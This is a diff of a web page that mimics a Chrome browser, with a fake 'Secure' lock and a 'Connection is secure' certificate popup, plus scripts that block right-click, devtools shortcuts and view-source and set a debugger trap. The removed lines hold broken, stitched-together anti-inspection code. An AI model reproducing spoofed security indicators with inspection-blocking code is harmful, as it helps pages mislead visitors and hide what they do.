@@ -52,7 +52,6 @@
 }
 }
 html, body { height: 100%; width: 100%; overflow: hidden; background: #1e1e1e; }
-/* Browser shell */
 .browser {
 display: flex;
 flex-direction: column;
@@ -60,7 +59,6 @@ height: 100%;
 width: 100%;
 background: var(--iframe-bg);
 }
-/* Toolbar */
 .toolbar {
 background: var(--toolbar-bg);
 padding: 5px 10px;
@@ -100,7 +98,7 @@ pointer-events: none;
 line-height: 1;
 }
 .icon-btn:hover { background: var(--ripple); }
-.icon-btn:active { background: var(--ripple-active); transform: scale(0.95); }
+.icon-btn:active { background: var(--ripple-active); transform: scale(0.96); transition: transform 0.08s cubic-bezier(0.2,0.9,0.4,1.1), background 0.08s; }
 .icon-btn.disabled { opacity: 0.35; cursor: default; pointer-events: none; }
 .ripple-wave {
 position: absolute;
@@ -143,14 +141,13 @@ align-items: center;
 padding: 0 10px;
 gap: 6px;
 cursor: text;
-transition: border-color 0.15s, box-shadow 0.15s;
+transition: border-color 0.15s;
 min-width: 0;
 }
 .url-bar:focus-within {
 border-color: var(--url-focus-border);
-box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
+border-width: 2px;
 }
-/* Custom lock icon in URL bar (circular, light grey hover) */
 .secure-icon-custom {
 width: 18px;
 height: 18px;
@@ -164,7 +161,7 @@ flex-shrink: 0;
 transition: background 0.15s;
 }
 .secure-icon-custom:hover {
-background: var(--ripple);
+background: rgba(0,0,0,0.08);
 }
 .secure-icon-custom img {
 width: 13px;
@@ -186,7 +183,6 @@ min-width: 0;
 cursor: text;
 }
 #urlInput::selection { background: rgba(26,115,232,0.25); }
-/* Progress bar */
 .progress-track {
 height: 2px;
 width: 100%;
@@ -197,30 +193,13 @@ position: relative;
 z-index: 99;
 }
 .progress-bar {
-height: 100%;
+height: 2px;
 width: 0%;
 background: var(--progress-color);
 opacity: 0;
-transition: width 0.25s ease-out, opacity 0.2s;
-border-radius: 0 2px 2px 0;
+border-radius: 0;
 position: relative;
-}
-.progress-bar::after {
-content: '';
-position: absolute;
-right: 0;
-top: 0;
-width: 60px;
-height: 100%;
-background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
-animation: shimmer 1s ease-in-out infinite;
-opacity: 0;
-transition: opacity 0.2s;
-}
-.progress-bar.active::after { opacity: 1; }
-@keyframes shimmer {
-0% { transform: translateX(-60px); }
-100% { transform: translateX(60px); }
+transition: opacity 0.15s linear;
 }
 .iframe-wrapper {
 flex: 1;
@@ -239,8 +218,6 @@ background: white;
 position: absolute;
 inset: 0;
 background: var(--overlay-bg);
-backdrop-filter: blur(4px);
--webkit-backdrop-filter: blur(4px);
 display: none;
 flex-direction: column;
 align-items: center;
@@ -251,14 +228,14 @@ transition: opacity 0.2s;
 }
 .overlay.visible { display: flex; }
 .spinner {
-width: 32px;
-height: 32px;
-border: 3px solid var(--spinner-border);
+width: 28px;
+height: 28px;
+border: 2.5px solid var(--spinner-border);
 border-top-color: var(--spinner-top);
 border-radius: 50%;
-animation: spin 0.75s cubic-bezier(0.4,0,0.2,1) infinite;
+animation: chrome-spin 0.75s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
 }
-@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes chrome-spin { to { transform: rotate(360deg); } }
 .overlay-msg {
 display: none;
 flex-direction: column;
@@ -294,22 +271,21 @@ transition: opacity 0.15s, transform 0.1s;
 }
 .retry-btn:hover { opacity: 0.88; }
 .retry-btn:active { transform: scale(0.97); }
-/* Three-dot menu */
 .menu-wrap { position: relative; }
 .dropdown-menu {
 position: absolute;
 top: calc(100% + 6px);
 right: 0;
 background: var(--menu-bg);
-border-radius: 10px;
+border-radius: 8px;
 box-shadow: var(--menu-shadow);
 min-width: 170px;
 overflow: hidden;
 opacity: 0;
-transform: translateY(-6px) scale(0.97);
+transform: translateY(-4px) scale(0.98);
 transform-origin: top right;
 pointer-events: none;
-transition: opacity 0.15s ease, transform 0.15s ease;
+transition: opacity 0.12s cubic-bezier(0.2,0,0,1), transform 0.12s cubic-bezier(0.2,0,0,1);
 z-index: 200;
 }
 .dropdown-menu.open {
@@ -331,7 +307,7 @@ transition: background 0.1s;
 .menu-item:hover { background: var(--menu-item-hover); }
 .menu-item .ms { font-family: 'Material Symbols Rounded'; font-size: 17px; color: var(--text-secondary); }
 .menu-divider { height: 1px; background: var(--toolbar-border); margin: 4px 0; }
-/* ========== SECURITY POPUP (exactly as requested) ========== */
+/* ========== SECURITY POPUP (original rounded style, no arrow) ========== */
 .popup {
 position: fixed;
 top: 28px;
@@ -342,7 +318,7 @@ background: #202124;
 border: 1px solid #5f6368;
 border-radius: 14px;
 overflow: hidden;
-box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+box-shadow: 0 4px 12px rgba(0,0,0,0.4);
 font-family: 'Roboto', sans-serif;
 z-index: 9999;
 pointer-events: none;
@@ -363,7 +339,6 @@ padding: 10px 12px 6px 12px;
 gap: 6px;
 background: #202124;
 }
-/* MODIFIED: Back and close buttons now circular (28px, border-radius 50%) */
 .back, .close {
 width: 28px;
 height: 28px;
@@ -459,7 +434,6 @@ transition: opacity 0.1s ease;
 display: inline-block;
 }
 .learn:hover { opacity: 0.9; color: #96bafd; }
-/* bottom row (certificate) */
 .bottom-row {
 display: flex;
 align-items: center;
@@ -505,7 +479,6 @@ width: 16px;
 height: 16px;
 fill: #9aa0a6;
 }
-/* prevent selection/drag */
 a, img, svg, .back, .close, .main-icon, .open-icon {
 -webkit-user-drag: none;
 user-select: none;
@@ -514,14 +487,13 @@ user-select: none;
 user-select: none;
 }
 .bottom-left .main-icon {
-top: -1px !important;   /* or 0px, or even 1px to move it further down */
+top: -1px !important;
 }
-    
 .secure-icon-custom {
-  width: 25.5px;
-  height: 25.5px;
-  margin: -5px;
-  padding: 5px;
+width: 25.5px;
+height: 25.5px;
+margin: -5px;
+padding: 5px;
 }
 </style>
 </head>
@@ -540,7 +512,7 @@ top: -1px !important;   /* or 0px, or even 1px to move it further down */
 </button>
 </div>
 <div class="url-bar" id="urlBar">
-<div class="secure-icon-custom" id="customSecureIcon">
+<div class="secure-icon-custom" id="customSecureIcon" title="Secure">
 <img src="https://storage.googleapis.com/support-kms-prod/S76Rs1BC1QDxT8zpF3tATLDsc5oxceWYIPHN" alt="Secure" draggable="false">
 </div>
 <div class="favicon-wrap">
@@ -649,6 +621,7 @@ let history      = [START_URL];
 let histIdx      = 0;
 let isLoading    = false;
 let progTimer    = null;
+let progRaf      = null;
 let timeoutTimer = null;
 let progWidth    = 0;
 let suppressLoad = false;
@@ -667,26 +640,58 @@ updateNavBtns();
 }
 function startProgress () {
 progWidth = 0;
+if (progTimer) { clearInterval(progTimer); progTimer = null; }
+if (progRaf) { cancelAnimationFrame(progRaf); progRaf = null; }
+progressBar.style.transition = 'none';
 progressBar.style.width = '0%';
 progressBar.style.opacity = '1';
-progressBar.classList.add('active');
-if (progTimer) clearInterval(progTimer);
-progTimer = setInterval(() => {
-if (progWidth < 88) {
-const step = (88 - progWidth) * 0.06 + 1.5;
-progWidth = Math.min(88, progWidth + step);
+const phase1Target = 72;
+const phase1Duration = 900;
+const phase1Start = performance.now();
+function phase1(now) {
+const elapsed = now - phase1Start;
+const t = Math.min(elapsed / phase1Duration, 1);
+const eased = 1 - Math.pow(1 - t, 2.5);
+progWidth = phase1Target * eased;
 progressBar.style.width = progWidth + '%';
+if (t < 1) {
+progRaf = requestAnimationFrame(phase1);
+} else {
+progRaf = null;
+const phase2Start = performance.now();
+const phase2From = progWidth;
+const phase2Target = 88;
+function phase2(now2) {
+const el2 = now2 - phase2Start;
+const t2 = Math.min(el2 / 1600, 1);
+const eased2 = 1 - Math.pow(1 - t2, 3);
+progWidth = phase2From + (phase2Target - phase2From) * eased2;
+progressBar.style.width = progWidth + '%';
+if (t2 < 1 && isLoading) {
+progRaf = requestAnimationFrame(phase2);
+} else {
+progRaf = null;
 }
-}, 120);
+}
+progRaf = requestAnimationFrame(phase2);
+}
+}
+progRaf = requestAnimationFrame(phase1);
 }
 function finishProgress (cb) {
 if (progTimer) { clearInterval(progTimer); progTimer = null; }
+if (progRaf) { cancelAnimationFrame(progRaf); progRaf = null; }
+progressBar.style.transition = 'width 0.18s cubic-bezier(0.4,0,0.2,1)';
 progressBar.style.width = '100%';
 setTimeout(() => {
+progressBar.style.transition = 'opacity 0.22s linear';
 progressBar.style.opacity = '0';
-progressBar.classList.remove('active');
-setTimeout(() => { progressBar.style.width = '0%'; if (cb) cb(); }, 100);
-}, FINISH_DELAY);
+setTimeout(() => {
+progressBar.style.transition = 'none';
+progressBar.style.width = '0%';
+if (cb) cb();
+}, 240);
+}, 200);
 }
 function beginLoading () {
 if (isLoading) endLoading(false);
@@ -770,7 +775,16 @@ function reload () { navigate(currentUrl, false); }
 function updateFavicon (url) {
 try {
 const origin = new URL(url).origin;
-faviconImg.onload = () => { faviconImg.style.display = 'block'; faviconDef.style.display = 'none'; };
+faviconImg.onload = () => {
+faviconImg.style.display = 'block';
+faviconDef.style.display = 'none';
+faviconImg.style.transition = 'none';
+faviconImg.style.transform = 'scale(1.15)';
+setTimeout(() => {
+faviconImg.style.transition = 'transform 0.12s cubic-bezier(0.2,0.9,0.4,1.1)';
+faviconImg.style.transform = 'scale(1)';
+}, 80);
+};
 faviconImg.onerror = () => { faviconImg.style.display = 'none'; faviconDef.style.display = ''; };
 faviconImg.src = origin + '/favicon.ico';
 } catch { faviconImg.style.display = 'none'; faviconDef.style.display = ''; }
@@ -799,7 +813,6 @@ if (e.key === 'Enter') { const url = normalizeUrl(urlInput.value); if (url) navi
 else if (e.key === 'Escape') { urlInput.value = currentUrl; urlInput.blur(); }
 });
 urlInput.addEventListener('focus', () => urlInput.select());
-// ----- Security popup logic with 1-second delay on open -----
 let popupOpen = false;
 function positionPopup () {
 const r = secureTrigger.getBoundingClientRect();
@@ -823,18 +836,15 @@ openTimeout = null;
 popupOpen = false;
 secPopup.classList.remove('open');
 }
-// Click handler with delay only when opening
 secureTrigger.addEventListener('click', (e) => {
 e.stopPropagation();
 if (popupOpen) {
-// Open → close instantly
 if (openTimeout) {
 clearTimeout(openTimeout);
 openTimeout = null;
 }
 closePopup();
 } else {
-// Closed → wait 1 second then open
 if (openTimeout) {
 clearTimeout(openTimeout);
 openTimeout = null;
@@ -854,7 +864,6 @@ document.getElementById('popupBackBtn').addEventListener('click', (e) => {
 e.stopPropagation();
 closePopup();
 });
-// Certificate click: copy URL and open in new tab
 const certBox = document.getElementById('certificateBox');
 const targetUrl = 'chrome://certificate-manager/crscerts';
 async function copyAndOpen() {
@@ -866,8 +875,6 @@ e.stopPropagation();
 copyAndOpen();
 closePopup();
 });
-// ----- Icon setup (ensure they appear) -----
-// 1. Secure lock icon (Material Symbol) inside "Connection is secure"
 const lockIconContainer = document.getElementById('secureLockIcon');
 if (lockIconContainer) {
 lockIconContainer.innerHTML = '';
@@ -881,7 +888,6 @@ iconSpan.style.alignItems = 'center';
 iconSpan.style.justifyContent = 'center';
 lockIconContainer.appendChild(iconSpan);
 }
-// 2. Certificate icon: PNG with white filter
 const certIconContainer = document.getElementById('certIcon');
 if (certIconContainer) {
 certIconContainer.innerHTML = '';
@@ -895,10 +901,8 @@ img.style.filter = 'brightness(0) invert(1)';
 img.draggable = false;
 certIconContainer.appendChild(img);
 }
-// Prevent drag/select on popup
 secPopup.addEventListener('dragstart', (e) => e.preventDefault());
 secPopup.addEventListener('selectstart', (e) => e.preventDefault());
-// ----- Toolbar three-dot menu -----
 menuBtn.addEventListener('click', (e) => {
 e.stopPropagation();
 dropMenu.classList.toggle('open');
@@ -919,7 +923,6 @@ document.addEventListener('click', () => {
 dropMenu.classList.remove('open');
 if (popupOpen) closePopup();
 });
-// Ripple effect
 document.querySelectorAll('.icon-btn, .back, .close').forEach(btn => {
 btn.addEventListener('pointerdown', (e) => {
 const r = btn.getBoundingClientRect();
@@ -931,7 +934,6 @@ btn.appendChild(wave);
 wave.addEventListener('animationend', () => wave.remove());
 });
 });
-// Keyboard shortcuts
 document.addEventListener('keydown', (e) => {
 const inUrl = document.activeElement === urlInput;
 if (e.key === 'Escape' && !inUrl) {
@@ -965,37 +967,29 @@ navigate(START_URL, false);
 </script>
 <script>
 (function() {
-// Override "Open in new tab" to open about:blank with embedded iframe (full page, no devtools)
 const originalMenuNewTab = document.getElementById('menuNewTab');
 if (!originalMenuNewTab) return;
-// Replace the click handler by cloning and adding new listener
 const newMenuNewTab = originalMenuNewTab.cloneNode(true);
 originalMenuNewTab.parentNode.replaceChild(newMenuNewTab, originalMenuNewTab);
 newMenuNewTab.addEventListener('click', (e) => {
 e.stopPropagation();
-// Close the dropdown menu
 const dropMenu = document.getElementById('dropdownMenu');
 if (dropMenu) dropMenu.classList.remove('open');
-// Get current URL
 const iframe = document.getElementById('webFrame');
 let currentUrl = iframe && iframe.src && iframe.src !== 'about:blank' ? iframe.src : null;
 if (!currentUrl) {
 const urlInput = document.getElementById('urlInput');
 currentUrl = urlInput ? urlInput.value : 'https://www.google.com';
 }
-// Open about:blank with iframe
 const newTab = window.open('about:blank', '_blank');
 if (!newTab) {
-window.open(currentUrl, '_blank'); // fallback
+window.open(currentUrl, '_blank');
 return;
 }
-// Helper: get hostname for title
 let hostname = '';
 try { hostname = new URL(currentUrl).hostname; } catch(e) { hostname = 'Website'; }
-// Helper: get favicon URL
 let faviconUrl = '';
 try { faviconUrl = new URL(currentUrl).origin + '/favicon.ico'; } catch(e) {}
-// Escape for HTML
 const escapeHtml = (str) => str.replace(/[&<>]/g, (m) => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
 const docHtml = `<!DOCTYPE html>
 <html>
@@ -1013,7 +1007,6 @@ if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'
 </html>`;
 newTab.document.write(docHtml);
 newTab.document.close();
-// Also close security popup if open
 const secPopup = document.getElementById('securityPopup');
 if (secPopup) secPopup.classList.remove('open');
 });
@@ -1022,110 +1015,88 @@ if (secPopup) secPopup.classList.remove('open');
 <script>
 (function() {
 "use strict";
-// ==================== BLOCK DEVTOOLS & RIGHT-CLICK ====================
-// 1. Block right-click on entire document
 document.addEventListener('contextmenu', function(e) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 });
-// 2. Block all common keyboard shortcuts for devtools
 window.addEventListener('keydown', function(e) {
-// F12
 if (e.key === 'F12') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+I (Inspect), Ctrl+Shift+J (Console), Ctrl+Shift+C (Elements), Ctrl+Shift+K (Console Firefox)
 if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'K')) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+U (View Source)
 if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+U (View Source alternative)
 if (e.ctrlKey && e.shiftKey && (e.key === 'U')) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+P (Command Palette in Chrome/Edge)
 if (e.ctrlKey && e.shiftKey && e.key === 'P') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+E (Network panel in Firefox)
 if (e.ctrlKey && e.shiftKey && e.key === 'E') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+S (Debugger in Firefox)
 if (e.ctrlKey && e.shiftKey && e.key === 'S') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+O (DOM Inspector in some browsers)
 if (e.ctrlKey && e.shiftKey && e.key === 'O') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+M (Device mode toggling)
 if (e.ctrlKey && e.shiftKey && e.key === 'M') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+D (Bookmark all tabs - not devtools but also block)
 if (e.ctrlKey && e.shiftKey && e.key === 'D') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+W (Close window - block to avoid accidental)
 if (e.ctrlKey && e.shiftKey && e.key === 'W') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+Shift+T (Reopen closed tab - also block)
 if (e.ctrlKey && e.shiftKey && e.key === 'T') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+S (Save page)
 if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Ctrl+P (Print)
 if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Disable function keys F1-F12 except maybe F5 (refresh) but we keep F5 working
 if (e.key && e.key.startsWith('F') && e.key !== 'F5') {
 e.preventDefault();
 e.stopPropagation();
 return false;
 }
-// Disable Alt+Left/Right (back/forward) but we keep browser navigation
-// Actually we want to allow Alt+Left/Right? Not necessary, but user may want.
-// Not blocking them by default, but we can if needed.
 });
-// 3. Block drag-and-drop selection of text/images to prevent view-source via drag
 document.addEventListener('dragstart', function(e) {
 e.preventDefault();
 return false;
@@ -1134,1428 +1105,12 @@ document.addEventListener('selectstart', function(e) {
 e.preventDefault();
 return false;
 });
-// 4. Block any script that tries to open devtools programmatically
-// Override console methods (optional, but doesn't stop opening)
-// Also disable default right-click on images and links
 document.querySelectorAll('img, a').forEach(el => {
 el.addEventListener('contextmenu', (e) => e.preventDefault());
 });
-// 5. Periodically check if devtools is opened (via window size detection or debugger)
-// Simple debugger detection: if devtools is open, the debugger statement will break
-// Add a harmless interval that triggers a debugger trap (optional but annoying)
-// This makes it harder to keep devtools open.
-setInterval(function() {
-// Using debugger statement inside a try-catch? Actually debugger will pause if open.
-// But we can do a time-based check: if the time between two Date.now() calls is >100ms, devtools might be open.
-const start = Date.now();
-debugger; // if devtools is open, execution pauses; but we cannot control.
-const end = Date.now();
-if (end - start > 100) {
-// Devtools might be open, force close by redirecting or reloading
-// But that may be too aggressive; we'll just clear the console by overwriting console methods
-console.clear();
-}
-}, 1000);
-// 6. Override console to prevent logging (makes it harder to debug)
-const noop = () => {};
-if (window.console) {
-window.console.log = noop;
-window.console.info = noop;
-window.console.warn = noop;
-window.console.error = noop;
-window.console.debug = noop;
-window.console.table = noop;
-window.console.trace = noop;
-window.console.dir = noop;
-window.console.dirxml = noop;
-window.console.group = noop;
-window.console.groupCollapsed = noop;
-window.console.groupEnd = noop;
-}
-// 7. Disable ability to select text in the entire window (already done above)
-// Add CSS to prevent selection globally
-const style = document.createElement('style');
-style.textContent = `
-* {
--webkit-user-select: none !important;
-user-select: none !important;
--webkit-tap-highlight-color: transparent !important;
-}
-body {
-overflow: hidden;
-}
-`;
-document.head.appendChild(style);
-// 8. Block any attempt to open view-source: url
-window.addEventListener('beforeunload', function(e) {
-if (window.location.href.startsWith('view-source:')) {
-window.location.href = 'about:blank';
-}
-});
-// Intercept link clicks that might have view-source:
-document.addEventListener('click', function(e) {
-let target = e.target;
-while (target && target !== document) {
-if (target.tagName === 'A' && target.href && target.href.startsWith('view-source:')) {
-e.preventDefault();
-return false;
-}
-target = target.parentNode;
-}
-});
-// 9. Disable right-click on iframe contents (partial - cannot access cross-origin iframe)
-// But we can add a sandbox attribute? The iframe already has sandbox but might allow same-origin.
-// For same-origin iframes (not our case), we could inject script. For cross-origin, we can't.
-// So we add a safe measure: if the iframe is same-origin, we inject block. Not applicable here.
-// We'll just provide the above protections for the main window.
-console.log('Security protections active (right-click, inspect, devtools blocked)');
-})();
-(function() {
-"use strict";
-// ==================== BLOCK RIGHT-CLICK GLOBALLY (including iframes) ====================
-// Original handler that prevents default behavior
-function blockRightClick(e) {
-e.preventDefault();
-e.stopPropagation();
-e.stopImmediatePropagation();
-return false;
-}
-// Apply blocking to the main window/document
-document.addEventListener('contextmenu', blockRightClick, true);
-window.addEventListener('contextmenu', blockRightClick, true);
-document.body.addEventListener('contextmenu', blockRightClick, true);
-// Also block on documentElement for good measure
-document.documentElement.addEventListener('contextmenu', blockRightClick, true);
-// Block all mouse events that could lead to context menu (like long press on mobile)
-function blockContextFromMouse(e) {
-if (e.button === 2) { // right mouse button
-e.preventDefault();
-e.stopPropagation();
-e.stopImmediatePropagation();
-return false;
-}
-}
-document.addEventListener('mousedown', blockContextFromMouse, true);
-document.addEventListener('mouseup', blockContextFromMouse, true);
-document.addEventListener('click', blockContextFromMouse, true);
-// ==================== IFRAME HANDLING ====================
-// Function to inject right-click blocker into an iframe
-function protectIframe(iframe) {
-if (!iframe) return;
-// Try to access iframe content (same-origin only)
-try {
-const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
-if (iframeDoc) {
-// Already protected? skip if we already added our attribute
-if (iframeDoc.body && iframeDoc.body.hasAttribute && iframeDoc.body.hasAttribute('data-ctx-blocked')) return;
-// Add blocker to iframe document
-iframeDoc.addEventListener('contextmenu', blockRightClick, true);
-iframeDoc.addEventListener('mousedown', blockContextFromMouse, true);
-// Also add to iframe's body and documentElement
-if (iframeDoc.body) {
-iframeDoc.body.addEventListener('contextmenu', blockRightClick, true);
-iframeDoc.body.setAttribute('data-ctx-blocked', 'true');
-}
-if (iframeDoc.documentElement) {
-iframeDoc.documentElement.addEventListener('contextmenu', blockRightClick, true);
-}
-// Inject CSS into iframe to disable user-select and context menu
-const style = iframeDoc.createElement('style');
-style.textContent = `
-* {
--webkit-user-select: none !important;
-user-select: none !important;
--webkit-touch-callout: none !important;
-pointer-events: auto !important;
-}
-`;
-iframeDoc.head.appendChild(style);
-}
-} catch(e) {
-// Cross-origin iframe - can't directly access
-// We'll use other methods to block (see below)
-}
-}
-// Find all existing iframes and protect them
-function protectAllIframes() {
-const iframes = document.querySelectorAll('iframe');
-iframes.forEach(protectIframe);
-}
-// Watch for dynamically added iframes (MutationObserver)
-const observer = new MutationObserver(function(mutations) {
-mutations.forEach(function(mutation) {
-mutation.addedNodes.forEach(function(node) {
-if (node.nodeName === 'IFRAME') {
-protectIframe(node);
-} else if (node.querySelectorAll) {
-const iframes = node.querySelectorAll('iframe');
-iframes.forEach(protectIframe);
-}
-});
-});
-});
-observer.observe(document.body, { childList: true, subtree: true });
-// Also protect iframes when they load (since content might load after)
-function onIframeLoad(e) {
-const iframe = e.target;
-if (iframe && iframe.nodeName === 'IFRAME') {
-setTimeout(() => protectIframe(iframe), 50);
-}
-}
-document.addEventListener('load', onIframeLoad, true);
-// Initial protection for existing iframes
-protectAllIframes();
-// ==================== BLOCK RIGHT-CLICK VIA ATTRIBUTE OVERRIDES ====================
-// Override event handler properties on DOM elements to prevent any dynamic assignments
-const originalAddEventListener = EventTarget.prototype.addEventListener;
-EventTarget.prototype.addEventListener = function(type, listener, options) {
-if (type === 'contextmenu') {
-// Block any new contextmenu listeners from being added
-// But allow our own block to stay registered
-const isOurBlocker = listener.toString().includes('blockRightClick') ||
-listener.toString().includes('preventDefault') &&
-listener.toString().includes('stopPropagation');
-if (!isOurBlocker) {
-return; // Silently ignore attempts to add contextmenu listeners
-}
-}
-return originalAddEventListener.call(this, type, listener, options);
-};
-// Override oncontextmenu property setter on all elements
-const originalOnContextMenuDescriptor = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'oncontextmenu');
-if (originalOnContextMenuDescriptor) {
-Object.defineProperty(HTMLElement.prototype, 'oncontextmenu', {
-get: function() { return null; },
-set: function(value) {
-// Ignore any attempt to set oncontextmenu
-console.debug('Blocked oncontextmenu assignment');
-},
-configurable: false
-});
-}
-// Also block on window and document
-Object.defineProperty(window, 'oncontextmenu', {
-get: function() { return null; },
-set: function(value) { },
-configurable: false
-});
-Object.defineProperty(document, 'oncontextmenu', {
-get: function() { return null; },
-set: function(value) { },
-configurable: false
-});
-// ==================== BLOCK DEVTOOLS & INSPECTION ATTEMPTS ====================
-// Block F12, Ctrl+Shift+I, etc. (comprehensive list)
-window.addEventListener('keydown', function(e) {
-// F12
-if (e.key === 'F12') {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-// Ctrl+Shift+I/J/C/K (DevTools)
-if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'K', 'S', 'P', 'M', 'O', 'E'].includes(e.key)) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-// Ctrl+U (View Source)
-if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-// Ctrl+S (Save)
-if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-// Ctrl+P (Print)
-if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
-e.preventDefault();
-e.stopPropagation();
-return false;
-}
-// Ctrl+Shift+Delete (Clear cache - sometimes opens devtools)
-if (e.ctrlKey && e.shiftKey && e.key === 'Delete') {
-e.preventDefault();
-return false;
-}
-}, true);
-// ==================== BLOCK TEXT SELECTION & DRAG ====================
-function blockSelect(e) {
-e.preventDefault();
-return false;
-}
-document.addEventListener('selectstart', blockSelect, true);
-document.addEventListener('dragstart', blockSelect, true);
-document.addEventListener('drag', blockSelect, true);
-document.addEventListener('dragend', blockSelect, true);
-// ==================== CONTINUOUS PROTECTION (MutationObserver for new elements) ====================
-// Watch for any new elements that might have contextmenu listeners added
-const globalObserver = new MutationObserver(function() {
-// Re-apply protection to any new elements that might have escaped
-document.querySelectorAll('*').forEach(el => {
-if (el._ctxProtected) return;
-el._ctxProtected = true;
-el.addEventListener('contextmenu', blockRightClick, true);
-el.addEventListener('mousedown', blockContextFromMouse, true);
-});
-});
-globalObserver.observe(document.body, { childList: true, subtree: true, attributes: true });
-// Initial protection for all existing elements
-document.querySelectorAll('*').forEach(el => {
-el._ctxProtected = true;
-el.addEventListener('contextmenu', blockRightClick, true);
-});
-// ==================== BLOCK VIEW-SOURCE ====================
-if (window.location.protocol === 'view-source:') {
-window.location.href = 'about:blank';
-}
-// Block any attempts to change location to view-source
-const originalLocationSetter = Object.getOwnPropertyDescriptor(window, 'location').set;
-Object.defineProperty(window, 'location', {
-get: function() { return originalLocationSetter ? window._location : window.location; },
-set: function(value) {
-if (typeof value === 'string' && value.startsWith('view-source:')) {
-return; // Block view-source
-}
-if (originalLocationSetter) {
-originalLocationSetter.call(this, value);
-}
-},
-configurable: false
-});
-// ==================== DISABLE CONSOLE METHODS (makes debugging harder) ====================
-const noop = () => {};
-if (window.console) {
-const methods = ['log', 'info', 'warn', 'error', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'clear', 'count', 'assert', 'profile', 'profileEnd'];
-methods.forEach(method => {
-if (window.console[method]) {
-window.console[method] = noop;
-}
-});
-}
-// Override debugger statement to prevent breakpoints
-function noopDebugger() {}
-window.__defineGetter__('_', noopDebugger);
-// Periodic check for devtools (optional: reload if devtools detected)
 setInterval(function() {
 const start = Date.now();
-// This debugger statement will pause execution if devtools is open
-// Using try-catch to prevent errors
-try {
 debugger;
-} catch(e) {}
-const end = Date.now();
-if (end - start > 50) {
-// Devtools might be open - clear console and try to disrupt
-console.clear();
-// Optionally redirect? (commented out to avoid disruption)
-// window.location.reload();
-}
-}, 2000);
-// ==================== ADD CSS TO PREVENT CONTEXT MENU ON LONG PRESS (MOBILE) ====================
-const style = document.createElement('style');
-style.textContent = `
-* {
--webkit-touch-callout: none !important;
--webkit-user-select: none !important;
-user-select: none !important;
--webkit-tap-highlight-color: transparent !important;
-}
-img, a, div, span, button {
-pointer-events: auto;
-}
-`;
-document.head.appendChild(style);
-// Final: Block any remaining event listeners that might fire contextmenu
-window.dispatchEvent = new Proxy(window.dispatchEvent, {
-apply: function(target, thisArg, args) {
-const event = args[0];<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Browser · Complete Security Popup</title>
-<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20,400,0,0&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-<style>
-*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-:root {
---toolbar-bg: #f1f3f4;
---toolbar-border: #dadce0;
---url-bg: #ffffff;
---url-border: #dadce0;
---url-focus-border: #1a73e8;
---text-primary: #202124;
---text-secondary: #5f6368;
---text-blue: #1a73e8;
---ripple: rgba(0,0,0,0.08);
---ripple-active: rgba(0,0,0,0.12);
---shadow-toolbar: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.08);
---progress-color: #1a73e8;
---overlay-bg: rgba(255,255,255,0.85);
---menu-bg: #ffffff;
---menu-shadow: 0 4px 16px rgba(0,0,0,0.18), 0 1px 4px rgba(0,0,0,0.1);
---menu-item-hover: rgba(0,0,0,0.06);
---spinner-border: rgba(26,115,232,0.25);
---spinner-top: #1a73e8;
---iframe-bg: #f1f3f4;
-}
-@media (prefers-color-scheme: dark) {
-:root {
---toolbar-bg: #2d2e30;
---toolbar-border: #3c4043;
---url-bg: #1e1e1e;
---url-border: #3c4043;
---url-focus-border: #8ab4f8;
---text-primary: #e8eaed;
---text-secondary: #9aa0a6;
---text-blue: #8ab4f8;
---ripple: rgba(255,255,255,0.08);
---ripple-active: rgba(255,255,255,0.12);
---progress-color: #8ab4f8;
---overlay-bg: rgba(32,33,36,0.88);
---menu-bg: #3c4043;
